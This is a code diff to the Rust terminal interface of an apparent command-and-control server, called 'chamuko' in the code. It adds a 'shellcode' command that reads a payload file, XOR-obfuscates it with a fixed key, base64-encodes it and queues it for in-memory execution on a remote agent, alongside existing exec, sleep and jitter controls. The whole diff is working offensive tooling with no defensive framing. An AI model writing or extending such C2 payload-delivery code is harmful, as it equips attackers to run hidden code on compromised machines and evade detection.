@@ -2,6 +2,7 @@ use std::io;
 use std::sync::{Arc, Mutex};
 use std::time::Duration;
 
+use base64::Engine;
 use crossterm::event::{self, Event, KeyCode, KeyEvent, KeyModifiers};
 use crossterm::execute;
 use crossterm::terminal::{
@@ -106,6 +107,7 @@ impl App {
                  list              refresh agent list\n  \
                  use <id>          select agent by id\n  \
                  exec <cmd...>     run command on agent\n  \
+                 shellcode <file>  send encrypted shellcode to agent (in-memory exec)\n  \
                  <cmd...>          alias for exec\n  \
                  sleep <s>         set agent sleep seconds\n  \
                  jitter <s>        set agent jitter seconds\n  \
@@ -116,6 +118,7 @@ impl App {
             "use" => self.handle_use(rest),
             "sleep" => self.handle_config("sleep", rest),
             "jitter" => self.handle_config("jitter", rest),
+            "shellcode" => self.handle_shellcode(rest),
             _ => self.send_to_agent(head, rest),
         }
     }
@@ -172,6 +175,51 @@ impl App {
         if s.enqueue_task(&id, command, args).is_none() {
             drop(s);
             self.local_log("failed to enqueue task");
+        }
+    }
+
+    fn handle_shellcode(&mut self, rest: &str) {
+        let Some(id) = self.selected_agent() else {
+            self.local_log("no agent selected (use 'list' / 'use <id>')");
+            return;
+        };
+        let path = rest.trim();
+        if path.is_empty() {
+            self.local_log("usage: shellcode <file>");
+            return;
+        }
+        let data = match std::fs::read(path) {
+            Ok(d) => d,
+            Err(e) => {
+                self.local_log(format!("failed to read shellcode file: {e}"));
+                return;
+            }
+        };
+        if data.is_empty() {
+            self.local_log("shellcode file is empty");
+            return;
+        }
+
+        let encrypted = chamuko_protocol::xor_transform(
+            &data,
+            chamuko_protocol::SHELLCODE_XOR_KEY,
+        );
+        let encoded = base64::engine::general_purpose::STANDARD.encode(&encrypted);
+
+        let mut s = self.state.lock().unwrap();
+        match s.enqueue_task(&id, "shellcode".to_string(), vec![encoded]) {
+            Some(task_id) => {
+                drop(s);
+                self.local_log(format!(
+                    "[c2] shellcode queued ({} bytes -> task {})",
+                    data.len(),
+                    task_id
+                ));
+            }
+            None => {
+                drop(s);
+                self.local_log("failed to enqueue shellcode task");
+            }
         }
     }
 
